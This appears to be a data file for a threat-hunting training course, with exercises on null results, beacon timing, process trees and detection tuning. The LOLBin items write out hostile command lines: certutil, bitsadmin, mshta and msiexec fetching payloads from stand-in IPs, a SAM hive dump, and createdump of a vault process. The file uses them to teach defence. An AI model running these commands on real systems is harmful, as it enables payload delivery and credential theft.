        title: "A Hunt That Finds Nothing Is Still a Result",
        prompt: "Theresa's rule for the word 'refuted': you may only use it if the data could have shown the opposite. Here are this quarter's hunts. Sort each by what its result really means, before it goes in the record.",
        buckets: [
          { id: "ref", label: "Refuted: the map gets smaller" },
          { id: "blind", label: "Inconclusive: you were blind" },
          { id: "conf", label: "Confirmed: stop hunting, hand it over" },
        ],
        items: [
          { id: "n1", text: "Service hunt: all 8 design servers reporting for all 90 days, every rare binary ticketed.", bucket: "ref", why: "The data was there, the search could have matched, and nothing unexplained came back. That route is closed for those hosts and those dates." },
          { id: "n2", text: "RDP hunt on finance: 0 rows, with all 40 hosts sending logon events for the whole window.", bucket: "ref", why: "Zero with full coverage means something. It's a smaller map, and a record the next hunter can rely on." },
          { id: "n3", text: "Script hunt on engineering laptops: 0 rows. Event ID 4104 was never switched on for that group.", bucket: "blind", why: "Zero rows from a log that doesn't exist. This isn't a clean result, it's a coverage gap, and a fix for it belongs on the list." },
          { id: "n4", text: "DNS hunt over 60 days: 0 rows. The resolver keeps 7 days of logs.", bucket: "blind", why: "You searched 60 days and held 7. At best that's a result for one week, and the record must say so." },
          { id: "n5", text: "Tool hunt on build servers: 0 rows. Three of the 12 stopped forwarding in September.", bucket: "blind", why: "Nine servers are clean. Three are unknown, and those are the ones an intruder would be happy about." },
          { id: "n6", text: "Encoded-command hunt: 0 rows. The same query also returns 0 on the purple team's known test host.", bucket: "blind", why: "If a query can't find a known positive, its zero means nothing. Test the search on something it should match before you trust the silence." },
          { id: "n7", text: "Task hunt: one scheduled task on one build server, no owner, running a file from a user's AppData, and that file is calling an unknown host.", bucket: "conf", why: "Rare, ownerless, and doing something real. That is past the point of a hypothesis, and it's no longer a hunter's job alone." },
        ],
        primer: {
          title: "What zero can mean",
          fold: true,
          points: [
            "A hunt that finds nothing has either ruled a threat out or found a gap in your coverage. The job is telling which.",
            "Before writing 'refuted', ask three things: were the right hosts reporting, was the whole window retained, and can this query match a known example?",
            "A refuted hypothesis is a result. Record what it rules out, on which hosts, over which dates.",
          ],
          example: {
            label: "A worked null: USB hunt at a bank's branches",
            lines: [
              "Claim: staff are moving files out on USB drives. Result: 0 rows.",
              "Check: all 90 branch PCs reporting? Yes. 30 days retained? Yes.",
              "Check: does the query match a test drive plugged in on purpose? It does.",
              "Call: denied for 90 PCs over 30 days. Now it means something.",
            ],
          },
        },
      },
    ],
    // ── q4: which parent would it leave ──
    "threat-hunt-q4": [
      {
        kind: "match",
        title: "Which Parent Would the Technique Leave?",
        prompt: "Stacking works on any field, but a good hunt picks the field its hypothesis points at. Before the team stacks process events, Theresa asks one question of each technique: if this happened, what would the parent process be? Match each one.",
        pairs: [
          { id: "p1", left: "A web shell on an IIS server runs a command", right: "w3wp.exe", why: "IIS runs site code in its worker process, so whatever the shell starts is a child of w3wp.exe." },
          { id: "p2", left: "A SQL Server stored procedure shells out with xp_cmdshell", right: "sqlservr.exe", why: "The command runs on behalf of the database engine, so it appears under the database process." },
          { id: "p3", left: "A macro in a spreadsheet starts a script", right: "excel.exe", why: "A macro runs inside the Office app that opened the file. Anything it starts is that app's child." },
          { id: "p4", left: "A malicious .hta file runs", right: "mshta.exe", why: "HTA files are executed by mshta.exe, so that's the parent of whatever they spawn." },
          { id: "p5", left: "An exploited Java application server starts a shell", right: "java.exe", why: "The vulnerable code runs inside the Java process, and so its children hang off java.exe." },
        ],
        primer: {
          title: "Parents and children",
          fold: true,
          points: [
            "Every Windows process has a **parent**: the process that started it.",
            "Code running inside an application starts its children under that application's name, so the parent tells you where the code was running.",
            "To hunt a technique, ask which parent it would leave. Then count each parent and child pair across the fleet, by hosts, and read from the rare end.",
            "A hit tells you where to look. You then check those hosts against known add-ins and scripts.",
          ],
          example: {
            label: "A worked pair: a web app server",
            lines: [
              "`tomcat9.exe` starts `whoami.exe` on 1 host of 40.",
              "A web server has no routine reason to ask who it is.",
              "One host, wrong parent for the job: that's a lead, so it goes to the top of the list.",
            ],
          },
        },
      },
    ],
    // ── q5: the second hypothesis ──
    "threat-hunt-q5": [
      {
        kind: "worksheet",
        title: "Read the Gaps Between Requests",
        prompt: "Services are off the map, so Theresa writes H2: \"If Glass Heron holds a foothold on engineering workstations, it must call home over HTTPS (T1071.001). I expect one process on a few hosts reaching a rare external host on a steady timer.\" One proxy extract stands out. Work it by hand before anyone calls it anything.",
        caption: "Proxy log extract · ASC-ENG-117 (10.20.4.117) · 2026-10-30 · TLS inspection on · this is the only internal host to reach this domain in 30 days",
        columns: ["time", "c-ip", "cs-host", "cs-method", "cs-uri-path", "sc-status", "sc-bytes"],
        rows: [
          ["09:02:11", "10.20.4.117", "telemetry-asc.example", "POST", "/v2/ping", "200", "1204"],
          ["09:17:29", "10.20.4.117", "telemetry-asc.example", "POST", "/v2/ping", "200", "1204"],
          ["09:32:05", "10.20.4.117", "telemetry-asc.example", "POST", "/v2/ping", "200", "18540"],
          ["09:47:40", "10.20.4.117", "telemetry-asc.example", "POST", "/v2/ping", "200", "1204"],
          ["10:02:13", "10.20.4.117", "telemetry-asc.example", "POST", "/v2/ping", "200", "1204"],
          ["10:17:31", "10.20.4.117", "telemetry-asc.example", "POST", "/v2/ping", "200", "1204"],
        ],
        questions: [
          { id: "gap", q: "How many seconds pass between the first two requests?", hint: "09:02:11 to 09:17:29. Fifteen minutes and a bit.", answer: ["918", "918 s", "918 seconds"], why: "15 minutes 18 seconds, or 918 s. The next gaps are 876, 935, 873 and 918." },
          { id: "band", q: "Across all five gaps, what is the largest minus the smallest, in seconds?", hint: "Work out all five gaps, then subtract the smallest from the largest.", answer: ["62", "62 s", "62 seconds"], why: "935 minus 873 is 62 s, around an average gap of 904. That narrow band is a 900-second sleep with a little jitter, and no person keeps time like that." },
          { id: "odd", q: "Which row's response is the odd one out? Give the row number.", hint: "Read down sc-bytes.", answer: ["3", "row 3"], why: "Five replies of exactly 1,204 bytes are the server saying 'nothing for you'. Row 3, at 18,540 bytes, is when it had a job waiting. Note the time, because something probably ran on the host just after it." },
        ],
        primer: {
          title: "What a beacon looks like",
          fold: true,
          points: [
            "A **beacon** is malware calling its command and control (C2) server on a timer to ask for work.",
            "Most implants add **jitter**, a random spread around the sleep time. A 900-second sleep with 5% jitter lands between 855 and 945, so expect a narrow band, not one exact number.",
            "A check-in with no work behind it brings back a small reply, and the size barely changes.",
            "A timer alone proves nothing, because licence checks and updaters keep time as well. Next ask how many hosts talk to that destination.",
          ],
          example: {
            label: "A worked read: a timer that turns out to be yours",
            lines: [
              "Gaps of 299, 302 and 299 seconds from a laptop to one internal host.",
              "Spread of 3 s on a 300 s timer, so about 1%. A machine is doing this.",
              "Who else talks to it? 640 laptops. It's the asset agent, and the crowd is what clears it.",
            ],
          },
        },
      },
    ],
    // ── q3: a confirmed finding is a live incident, then the rule ──
    "threat-hunt-q3": [
      {
        kind: "outbreak",
        title: "Confirmed Means It Is Still Moving",
        prompt: "H2 is confirmed, and the intruder holds an admin account. Theresa runs this drill with every new hunter before the first real hand-off. The map is an engineering network. Each turn you isolate one host, and each turn the intruder moves one link. Keep it away from TAPE-OUT, the share with the Kestrel layout.",
        hostPrefix: "ENG",
        cols: 6,
        rows: 5,
        crown: "TAPE-OUT",
        via: "WMI with a stolen admin account",
        lesson: "You could feel what each turn cost. The intruder doesn't pause while a finding waits for someone to act on it, and that's why a confirmed hunt stops being a hunt. Containment is a different job on a different clock, with people who need the machines as you found them. Cut ahead of the spread, at the place the network narrows, because a host that has already fallen is one you can no longer save.",
        primer: {
          title: "When a hunt stops being a hunt",
          fold: true,
          points: [
            "A confirmed finding is a live incident. Ownership moves to incident response (IR) as soon as you can say it happened here.",
            "Pass over what you have, as you found it: hosts, times, the query, raw events. Responders decide what to capture and when to contain.",
            "Detection work carries on alongside, once the case is in IR's hands.",
            "In this drill, a fallen host is gone. Each cut has to land ahead of the spread, where one host links many others.",
          ],
          example: {
            label: "A worked hand-off: a public web server",
            lines: [
              "10:12 A hunter confirms a web shell on a public server.",
              "10:15 IR has a case with the host, times, query and raw events attached.",
              "10:20 IR captures memory and a disk image, then chooses how to contain it.",
              "11:05 The hunter drafts the rule while IR works the case.",
            ],
          },
        },
      },
      {
        kind: "tune",
        title: "Earn the Alert: From Hunt to Detection",
        prompt: "IR has the case, so the hunters turn to the work that runs alongside it. H2 worked by hand. Before it becomes a scheduled rule, Theresa replays its logic over 30 days of proxy data with purple team runs and sector samples mixed in. The rule fires when a destination's timing spread and its host count are both within your limits. Find the setting that makes it worth waking someone up, or it stays a hunt.",
        eventColumn: "Timer found in the 30-day replay",
        dials: [
          { id: "jitter", label: "Timing spread at or below", short: "jitter", unit: "%", min: 1, max: 40, step: 1, start: 40, dir: "below" },
          { id: "hosts", label: "Internal hosts reaching this destination at or below", short: "hosts", min: 1, max: 60, step: 1, start: 60, dir: "below" },
        ],
        events: [
          { id: "b1", label: "Purple run: 900 s sleep on one laptop", bad: true, values: { jitter: 5, hosts: 1 } },
          { id: "b2", label: "Purple run: one-hour sleep on 2 laptops", bad: true, values: { jitter: 10, hosts: 2 } },
          { id: "b3", label: "Purple run: 300 s sleep, wide jitter, 4 hosts", bad: true, values: { jitter: 22, hosts: 4 } },
          { id: "b4", label: "Sector sample: implant set to look like browsing", bad: true, values: { jitter: 26, hosts: 3 } },
          { id: "b5", label: "Sector sample: one implant across a whole team", bad: true, values: { jitter: 12, hosts: 11 } },
          { id: "b6", label: "Sector sample: implant with very wide jitter", bad: true, values: { jitter: 38, hosts: 1 } },
          { id: "n1", label: "Asset agent check-in", bad: false, values: { jitter: 2, hosts: 612 } },
          { id: "n2", label: "EDA licence portal", bad: false, values: { jitter: 4, hosts: 14 } },
          { id: "n3", label: "Patch catalogue check", bad: false, values: { jitter: 6, hosts: 31 } },
          { id: "n4", label: "Weather widget on the lobby screen", bad: false, values: { jitter: 3, hosts: 1 } },
          { id: "n5", label: "Share price ticker on two finance PCs", bad: false, values: { jitter: 28, hosts: 2 } },
          { id: "n6", label: "Foundry partner's status API, polled by a script", bad: false, values: { jitter: 8, hosts: 5 } },
          { id: "n7", label: "Auto-refreshing dashboard tab", bad: false, values: { jitter: 31, hosts: 1 } },
        ],
        goal: { catch: 5, maxFalse: 2 },
        deploys: 4,
        lesson: "Jitter at 26 or 27 and hosts at 11 to 13 catch 5 of the 6 attacks with 2 false alarms. Recall is 5 of 6, 83%. Precision is 5 of 7, 71%. A round 25 loses the sample built to look like browsing, and a round 30 lets the ticker in. The two false alarms go in the rule's notes so triage knows them on sight. The 38% sample is the known miss, written down with a reason, and it stays on the hunters' list. That's the trade: a rule takes over the part of a hunt a machine can do, and the hunters move on to the part it can't.",
        primer: {
          title: "From hunt to detection",
          fold: true,
          points: [
            "A hunt runs when a person runs it. A **detection** runs on a schedule and wakes someone up, so it has to earn that.",
            "Replay the logic on past data with known-bad samples mixed in, before it goes live.",
            "**Recall** is real attacks caught divided by all attacks. **Precision** is real alerts divided by all alerts.",
            "A false alarm you accept and a miss you accept both go in the rule's notes, with the reason.",
            "If no setting gets close, it stays a hunt: something a person still does on purpose.",
          ],
          example: {
            label: "A worked replay: a rule for new domain admins",
            lines: [
              "Logic: an account joins Domain Admins outside a change window.",
              "Replay over 90 days: 6 alerts, of which 5 are red team tests and 1 a late change.",
              "Precision 5 of 6, 83%. Recall 5 of 5, 100%.",
              "Decision: ship it, and name the late change as a known false alarm.",
            ],
          },
        },
      },
    ],
    // ── la1: reading the record ──
    "threat-hunt-la1": [
      {
        kind: "anatomy",
        title: "Read a Signed Tool's Process Record",
        prompt: "IR has the case. While responders work, they send Theresa one record from ASC-ENG-117, 2026-10-29, 02:14 UTC, the day before your proxy extract. No tool on it is on any blocklist. Scan each field and see what it tells you.",
        source: "EDR process event · ASC-ENG-117",
        fields: [
          { key: "ContextBaseFileName", value: "createdump.exe", label: "The process", note: "A real tool. It ships with the .NET runtime and Microsoft signs it. The name tells you almost nothing about intent." },
          { key: "CommandLine", value: "createdump.exe -u -f C:\\ProgramData\\rt\\d.dmp 7316", label: "What it was told to do", note: "-u asks for a full dump, -f names the output file, and the bare number at the end is the PID (process ID) of the process to dump. That's where the intent is." },
          { key: "ParentBaseFileName", value: "powershell.exe", label: "Who started it", note: "One level up the process tree. This field is the first pivot from any hit: it's how the command got there." },
          { key: "UserName", value: "ALDERNEYSEMI\\adm-k.osei", label: "Whose rights", note: "An admin account, at 02:14, on an engineer's workstation. Check that against what the account normally does." },
          { key: "ComputerName", value: "ASC-ENG-117", label: "The device", note: "PIDs mean something only on one device at one moment, so always carry the device along with the PID." },
          { key: "SHA256HashData", value: "9d1c7e2a4b6f03581e7ca2d490b3f6c81a5e7d20c4f19b36e2a80d57c13f6b94", label: "The file's hash", note: "It matches the file Microsoft ships. A clean hash says what the file is, and nothing about how it was used." },
        ],
        summary: "A signed Microsoft tool, started by PowerShell under an admin account at 02:14, wrote a full memory dump of process 7316 into ProgramData.",
        primer: {
          title: "How to read a process record",
          fold: true,
          points: [
            "Separate **what ran** from **what it was told to do**. The image name says little, and the command line says most.",
            "Windows names a running process by its **PID**, so a tool that acts on another process has to be handed one. Confirm it against a process list from that host at that time.",
            "`rundll32.exe` runs one named function from a DLL. The form is `rundll32.exe <dll>,<function> <arguments>`.",
            "**Parent** fields name the process that started this one.",
          ],
          example: {
            label: "A worked read: opening a control panel page",
            lines: [
              "`rundll32.exe shell32.dll,Control_RunDLL desk.cpl`",
              "`shell32.dll` is the DLL, and `Control_RunDLL` is the function.",
              "`desk.cpl` is the argument that function receives, here a harmless display settings page.",
            ],
          },
        },
      },
      {
        kind: "sort",
        title: "Name, Hash or Behaviour?",
        prompt: "Alderney's EDR keeps a list of known attack tools. Theresa wants the team to be honest about what that list can and can't do. These all turned up in the sector's reports. For each one, decide what would actually catch it.",
        buckets: [
          { id: "list", label: "The list can catch it" },
          { id: "act", label: "Only its behaviour gives it away" },
        ],
        items: [
          { id: "b1", text: "certutil.exe -urlcache -f http://203.0.113.20/a.bin a.bin", bucket: "act", why: "certutil.exe ships with Windows and is Microsoft-signed. Its name and hash are the same on every PC. A certificate tool fetching a file from a bare IP is the tell." },
          { id: "b2", text: "bitsadmin.exe /transfer j http://203.0.113.20/b.bin C:\\ProgramData\\b.bin", bucket: "act", why: "A built-in Windows transfer tool, signed and everywhere. What stands out is the destination and the folder." },
          { id: "b3", text: "reg.exe save HKLM\\SAM C:\\ProgramData\\s.hiv", bucket: "act", why: "reg.exe is a daily admin tool. Saving the SAM hive to a shared folder is what makes it suspicious, and no list of bad files will ever say so." },
          { id: "b4", text: "mshta.exe http://203.0.113.20/p.hta", bucket: "act", why: "Signed and built in. An HTA fetched straight from a remote address is the behaviour to hunt." },
          { id: "l1", text: "nc.exe, a public netcat build, dropped into C:\\ProgramData", bucket: "list", why: "A known hacking tool with a stable public hash, and it has no business on a design workstation. This is what such a list is for." },
          { id: "l2", text: "rclone.exe, public build, downloaded to a workstation that has never used it", bucket: "list", why: "A public binary that isn't part of Windows or the software baseline, so a hash or name entry can match it." },
          { id: "l3", text: "The exact loader build named in last week's intel feed", bucket: "list", why: "An unchanged file with a published hash. It works once, against that build." },
        ],
        primer: {
          title: "Living off the land",
          fold: true,
          points: [
            "**LOLBins**, living-off-the-land binaries, are legitimate tools that ship with Windows or trusted software, put to an attacker's use.",
            "A list of bad files works by comparison, and a file every PC already has gives it nothing to compare.",
            "Blocking such a tool outright usually breaks something real, so defenders have to judge what it did rather than what it is.",
          ],
          example: {
            label: "A worked read: msiexec",
            lines: [
              "`msiexec.exe /q /i http://198.51.100.9/u.msi`",
              "The file is Microsoft's, and its hash is the same on every PC.",
              "The tell: a silent install from a bare IP address, started by a script at night.",
            ],
          },
        },
      },
    ],
    // ── flag1: up the tree ──
    "threat-hunt-flag1": [
      {
        kind: "trace",
        title: "Follow the IDs Up the Tree",
        prompt: "One record is a starting point. Theresa wants the chain above it before IR's next call. Follow the IDs, not the names: names repeat, and the wrong row looks just like the right one.",
        lead: "ASC-ENG-117, 2026-10-29 02:14 UTC: createdump.exe dumped PID 7316, and the dump's own record gives ParentProcessId 7355100886.",
        steps: [
          {
            id: "s1",
            ask: "First, the target. Which process was PID 7316 on this device?",
            source: "Process snapshot · PID search · 2026-10-29 02:10 UTC",
            columns: ["ComputerName", "PID", "ImageFileName", "UserName"],
            rows: [
              ["ASC-ENG-204", "7316", "chrome.exe", "ALDERNEYSEMI\\j.ferro"],
              ["ASC-ENG-117", "7316", "dsvault.exe", "ALDERNEYSEMI\\m.tanaka"],
              ["ASC-ENG-117", "7136", "lmutil.exe", "ALDERNEYSEMI\\m.tanaka"],
              ["ASC-ENG-042", "7316", "msedge.exe", "ALDERNEYSEMI\\s.laurent"],
            ],
            answer: 1,
            why: "PIDs repeat across devices, so a match needs the device as well. On ASC-ENG-117, 7316 is dsvault.exe, the design vault client. Its memory holds the signed-in engineer's vault session.",
            learned: "Target: dsvault.exe, PID 7316, on ASC-ENG-117",
          },
          {
            id: "s2",
            ask: "ParentProcessId was 7355100886. Which row is that parent's own record?",
            source: "EDR process events · ASC-ENG-117 · 2026-10-29",
            columns: ["time", "ContextBaseFileName", "TargetProcessId", "ParentProcessId", "ParentBaseFileName", "UserName"],
            rows: [
              ["02:13:40", "wmiprvse.exe", "7355094112", "7354218830", "svchost.exe", "NT AUTHORITY\\NETWORK SERVICE"],
              ["02:13:58", "powershell.exe", "7355099327", "7354871604", "WindowsTerminal.exe", "ALDERNEYSEMI\\m.tanaka"],
              ["02:14:03", "powershell.exe", "7355100886", "7355094112", "wmiprvse.exe", "ALDERNEYSEMI\\adm-k.osei"],
              ["02:14:09", "createdump.exe", "7355103751", "7355100886", "powershell.exe", "ALDERNEYSEMI\\adm-k.osei"],
            ],
            answer: 2,
            why: "TargetProcessId is a process's own ID, so 7355100886 in that column is the parent. This is Falcon's long ID, not the OS PID, which sits in RawProcessId: OS PIDs get reused, so Falcon gives each process an ID of its own. The other powershell.exe has the same name and belongs to the engineer's own session. Follow a name and you'd have blamed the wrong one.",
            learned: "Parent: powershell.exe, run as adm-k.osei",
          },
          {
            id: "s3",
            ask: "One more level. Which row started that PowerShell?",
            source: "EDR process events · ASC-ENG-117 · 2026-10-29",
            columns: ["time", "ContextBaseFileName", "TargetProcessId", "ParentProcessId", "ParentBaseFileName", "UserName"],
            rows: [
              ["02:14:09", "createdump.exe", "7355103751", "7355100886", "powershell.exe", "ALDERNEYSEMI\\adm-k.osei"],
              ["02:14:03", "powershell.exe", "7355100886", "7355094112", "wmiprvse.exe", "ALDERNEYSEMI\\adm-k.osei"],
              ["02:13:58", "powershell.exe", "7355099327", "7354871604", "WindowsTerminal.exe", "ALDERNEYSEMI\\m.tanaka"],
              ["02:13:40", "wmiprvse.exe", "7355094112", "7354218830", "svchost.exe", "NT AUTHORITY\\NETWORK SERVICE"],
            ],
            answer: 3,
            why: "That PowerShell's ParentProcessId is 7355094112, and that's wmiprvse.exe, the WMI provider host. Commands started remotely over WMI appear under it. That's how the intruder reached this workstation, and it's the route H1 could never have seen.",
            learned: "Arrived by: WMI, through wmiprvse.exe",
          },
        ],
      },
    ],
  },
};
